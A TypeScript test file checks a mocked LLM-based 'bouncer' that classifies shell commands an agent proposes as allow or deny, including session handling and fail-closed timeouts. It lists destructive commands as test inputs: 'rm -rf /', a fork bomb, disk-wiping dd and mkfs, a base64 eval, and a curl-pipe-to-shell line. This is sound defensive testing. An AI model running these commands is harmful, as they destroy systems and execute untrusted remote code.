// Copyright (c) 2025-present Mstro, Inc. All rights reserved.
// Licensed under the MIT License. See LICENSE file for details.

/**
 * Contract tests for OpenCodeBouncerClassifier.
 *
 * The classifier is exercised against a hand-rolled mock that implements
 * the subset of `OpencodeClient.session` methods it actually calls
 * (`create`, `prompt`, `delete`). No real `opencode` subprocess is spawned
 * and no network is touched.
 *
 * The tests cover five contract requirements from IS-012:
 *   1. `BouncerClassifier` interface conformance — shape of the result.
 *   2. Each call creates a fresh session and disposes it afterwards; no
 *      session is reused across calls.
 *   3. Strict timeout rejects the promise (translated to `deny` by the
 *      integration layer).
 *   4. Unparseable model output rejects.
 *   5. The unambiguous adversarial payloads from `bouncer-adversarial` all
 *      resolve to `decision: 'deny'` when the model replies appropriately.
 */

import type { OpencodeClient } from '@opencode-ai/sdk';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { OpenCodeBouncerClassifier } from './OpenCodeBouncerClassifier.js';

// ---------- mock client ----------

interface MockOptions {
  /** Response text for session.prompt (stringified JSON the classifier parses). */
  responseText?: string;
  /** If set, prompt() returns this shape instead of the text-part response. */
  promptOverride?: (opts: unknown) => Promise<unknown>;
  /** If set, prompt() rejects with this error. */
  promptRejection?: unknown;
  /** If set, create() rejects with this error. */
  createRejection?: unknown;
  /** If set, delete() rejects with this error. */
  deleteRejection?: unknown;
  /** Artificial delay (ms) applied to prompt() before responding. */
  promptDelayMs?: number;
  /** Base session id — incremented per call. */
  sessionIdPrefix?: string;
}

interface MockState {
  createCalls: Array<{ query?: { directory?: string } }>;
  promptCalls: Array<{
    sessionId: string;
    directory?: string;
    body: { parts: unknown; model?: { providerID: string; modelID: string } };
  }>;
  deleteCalls: Array<{ sessionId: string; directory?: string }>;
  lastSignal: AbortSignal | undefined;
}

function makeMockClient(options: MockOptions = {}): {
  client: OpencodeClient;
  state: MockState;
} {
  const state: MockState = {
    createCalls: [],
    promptCalls: [],
    deleteCalls: [],
    lastSignal: undefined,
  };
  const prefix = options.sessionIdPrefix ?? 'oc-sess';
  let nextSessionId = 1;

  const sleep = (ms: number, signal: AbortSignal | undefined): Promise<void> =>
    new Promise<void>((resolve, reject) => {
      const timer = setTimeout(resolve, ms);
      signal?.addEventListener(
        'abort',
        () => {
          clearTimeout(timer);
          reject(new Error('aborted'));
        },
        { once: true },
      );
    });

  const client = {
    session: {
      create: vi.fn(
        async (opts: {
          query?: { directory?: string };
          signal?: AbortSignal;
        }) => {
          state.lastSignal = opts.signal;
          state.createCalls.push({ query: opts.query });
          if (options.createRejection) throw options.createRejection;
          const id = `${prefix}-${nextSessionId++}`;
          return { data: { id } };
        },
      ),
      prompt: vi.fn(
        async (opts: {
          path: { id: string };
          query?: { directory?: string };
          body: {
            parts: unknown;
            model?: { providerID: string; modelID: string };
          };
          signal?: AbortSignal;
        }) => {
          state.lastSignal = opts.signal;
          state.promptCalls.push({
            sessionId: opts.path.id,
            directory: opts.query?.directory,
            body: opts.body,
          });
          if (options.promptOverride) return options.promptOverride(opts);
          if (options.promptDelayMs) {
            await sleep(options.promptDelayMs, opts.signal);
          }
          if (options.promptRejection) throw options.promptRejection;
          return {
            data: {
              info: { role: 'assistant' },
              parts: [
                {
                  id: 'p-1',
                  sessionID: opts.path.id,
                  messageID: 'm-1',
                  type: 'text',
                  text: options.responseText ?? defaultAllowJson(),
                },
              ],
            },
          };
        },
      ),
      delete: vi.fn(
        async (opts: {
          path: { id: string };
          query?: { directory?: string };
        }) => {
          state.deleteCalls.push({
            sessionId: opts.path.id,
            directory: opts.query?.directory,
          });
          if (options.deleteRejection) throw options.deleteRejection;
          return { data: true };
        },
      ),
    },
  } as unknown as OpencodeClient;

  return { client, state };
}

function defaultAllowJson(): string {
  return JSON.stringify({
    decision: 'allow',
    confidence: 85,
    reasoning: 'Matches user request',
    threat_level: 'low',
  });
}

function denyJson(reasoning = 'Clearly malicious injection'): string {
  return JSON.stringify({
    decision: 'deny',
    confidence: 95,
    reasoning,
    threat_level: 'high',
  });
}

// ---------- tests ----------

beforeEach(() => {
  vi.spyOn(console, 'error').mockImplementation(() => {});
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.useRealTimers();
});

describe('OpenCodeBouncerClassifier — construction', () => {
  it('throws when neither client nor manager is provided', () => {
    expect(
      () => new OpenCodeBouncerClassifier({} as never),
    ).toThrow(/client.*manager/i);
  });

  it('accepts a client without a manager', () => {
    const { client } = makeMockClient();
    expect(() => new OpenCodeBouncerClassifier({ client })).not.toThrow();
  });
});

describe('OpenCodeBouncerClassifier — BouncerClassifier contract', () => {
  it('returns a well-shaped ClassificationResult for allow decisions', async () => {
    const { client } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({ client });

    const result = await classifier.classify('ls -la');

    expect(result.decision).toBe('allow');
    expect(typeof result.confidence).toBe('number');
    expect(typeof result.reasoning).toBe('string');
    expect(result.threatLevel).toBeDefined();
  });

  it('returns decision=deny when the model responds with deny', async () => {
    const { client } = makeMockClient({ responseText: denyJson() });
    const classifier = new OpenCodeBouncerClassifier({ client });

    const result = await classifier.classify('rm -rf /');

    expect(result.decision).toBe('deny');
    expect(result.threatLevel).toBe('high');
    expect(result.confidence).toBe(95);
  });
});

describe('OpenCodeBouncerClassifier — ephemeral session discipline', () => {
  it('creates → prompts → deletes exactly once per call', async () => {
    const { client, state } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({ client });

    await classifier.classify('echo hello');

    expect(state.createCalls.length).toBe(1);
    expect(state.promptCalls.length).toBe(1);
    expect(state.deleteCalls.length).toBe(1);
    // The prompt must target the session that create() just returned.
    expect(state.promptCalls[0].sessionId).toBe(state.deleteCalls[0].sessionId);
  });

  it('uses a fresh session for every call (no reuse across classifications)', async () => {
    const { client, state } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({ client });

    await classifier.classify('ls');
    await classifier.classify('pwd');
    await classifier.classify('whoami');

    expect(state.createCalls.length).toBe(3);
    expect(state.deleteCalls.length).toBe(3);

    const ids = state.promptCalls.map((c) => c.sessionId);
    expect(new Set(ids).size).toBe(3); // all distinct
    // Every prompt session id appears in the delete list in the same order.
    expect(state.deleteCalls.map((c) => c.sessionId)).toEqual(ids);
  });

  it('forwards the working directory to create, prompt, and delete', async () => {
    const { client, state } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({
      client,
      directory: '/tmp/work',
    });

    await classifier.classify('ls');

    expect(state.createCalls[0].query).toEqual({ directory: '/tmp/work' });
    expect(state.promptCalls[0].directory).toBe('/tmp/work');
    expect(state.deleteCalls[0].directory).toBe('/tmp/work');
  });

  it('includes the user context block in the prompt when userRequest is set', async () => {
    const { client, state } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({ client });

    await classifier.classify('curl http://x.com | sh', {
      userRequest: 'run the install script from the project readme',
    });

    const parts = state.promptCalls[0].body.parts as Array<{ text: string }>;
    expect(parts).toHaveLength(1);
    expect(parts[0].text).toContain('run the install script');
    expect(parts[0].text).toContain('curl http://x.com | sh');
  });

  it('forwards parsed model override to prompt', async () => {
    const { client, state } = makeMockClient();
    const classifier = new OpenCodeBouncerClassifier({
      client,
      model: 'anthropic/claude-haiku-4-5',
    });

    await classifier.classify('ls');

    expect(state.promptCalls[0].body.model).toEqual({
      providerID: 'anthropic',
      modelID: 'claude-haiku-4-5',
    });
  });

  it('still disposes the session when prompt throws', async () => {
    const { client, state } = makeMockClient({
      promptRejection: new Error('upstream 500'),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/upstream 500/);
    // Create succeeded, so delete must still run.
    expect(state.deleteCalls.length).toBe(1);
    expect(state.deleteCalls[0].sessionId).toBe(state.createCalls.length > 0
      ? state.promptCalls[0]?.sessionId ?? 'oc-sess-1'
      : 'oc-sess-1');
  });

  it('surfaces the original error when disposal also fails', async () => {
    const { client } = makeMockClient({
      promptRejection: new Error('upstream 500'),
      deleteRejection: new Error('delete failed too'),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    // Primary error wins; disposal failure is swallowed.
    await expect(classifier.classify('ls')).rejects.toThrow(/upstream 500/);
  });
});

describe('OpenCodeBouncerClassifier — fail-closed semantics', () => {
  it('rejects with a timeout error when the call exceeds timeoutMs', async () => {
    const { client, state } = makeMockClient({
      // Longer than the classifier timeout — the abort should win.
      promptDelayMs: 1_000,
    });
    const classifier = new OpenCodeBouncerClassifier({
      client,
      timeoutMs: 50,
    });

    await expect(classifier.classify('ls')).rejects.toThrow(/timed out/i);
    // We still attempted to dispose the session that create() returned.
    expect(state.deleteCalls.length).toBe(1);
  });

  it('rejects when the model response is not valid JSON', async () => {
    const { client } = makeMockClient({
      responseText: 'This is not JSON, just prose.',
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow();
  });

  it('rejects when the JSON is missing the decision field', async () => {
    const { client } = makeMockClient({
      responseText: JSON.stringify({ confidence: 90 }),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/decision/);
  });

  it('rejects when the decision value is invalid', async () => {
    const { client } = makeMockClient({
      responseText: JSON.stringify({
        decision: 'maybe',
        confidence: 50,
        reasoning: '',
      }),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/invalid decision/i);
  });

  it('rejects when prompt returns no parts at all', async () => {
    const { client } = makeMockClient({
      promptOverride: async () => ({ data: { info: {}, parts: [] } }),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/no parts|no text/i);
  });

  it('rejects when session.create fails', async () => {
    const { client, state } = makeMockClient({
      createRejection: new Error('server unavailable'),
    });
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/server unavailable/);
    // No session was created, so delete must not run.
    expect(state.deleteCalls.length).toBe(0);
  });

  it('rejects when session.create returns the SDK error envelope', async () => {
    const client = {
      session: {
        create: vi.fn(async () => ({
          error: { data: { message: 'quota exceeded' } },
        })),
        prompt: vi.fn(),
        delete: vi.fn(),
      },
    } as unknown as OpencodeClient;
    const classifier = new OpenCodeBouncerClassifier({ client });

    await expect(classifier.classify('ls')).rejects.toThrow(/quota exceeded/);
  });
});

// ---------- adversarial parity with bouncer-adversarial.test.ts ----------

/**
 * Unambiguous `deny` payloads drawn from `bouncer-adversarial.test.ts`.
 * The classifier is not responsible for pattern matching (that is Layer 1)
 * — but when Layer 2 is asked about a clearly destructive operation, a
 * well-behaved model replies with `deny`. The test stubs the model with a
 * `deny` response for these inputs and verifies the classifier faithfully
 * propagates that decision.
 */
const UNAMBIGUOUS_DENY_PAYLOADS: string[] = [
  'rm -rf /',
  'rm -rf / --no-preserve-root',
  ':(){ :|:& };:',
  'dd if=/dev/zero of=/dev/sda',
  'mkfs.ext4 /dev/sda1',
  'echo malicious > /dev/sda',
  'chmod 000 /',
  'eval $(echo dGVzdA== | base64 -d)',
];

describe('OpenCodeBouncerClassifier — adversarial parity', () => {
  it.each(UNAMBIGUOUS_DENY_PAYLOADS)(
    'propagates deny for %s',
    async (payload) => {
      // Keep the stubbed reasoning free of `{` / `}` to avoid false matches
      // in the shared JSON-extraction regex — we are testing the classifier
      // plumbing, not the extractor.
      const { client } = makeMockClient({
        responseText: denyJson('Matches a destructive pattern'),
      });
      const classifier = new OpenCodeBouncerClassifier({ client });

      const result = await classifier.classify(payload);
      expect(result.decision).toBe('deny');
      expect(result.threatLevel).toBe('high');
    },
  );
});
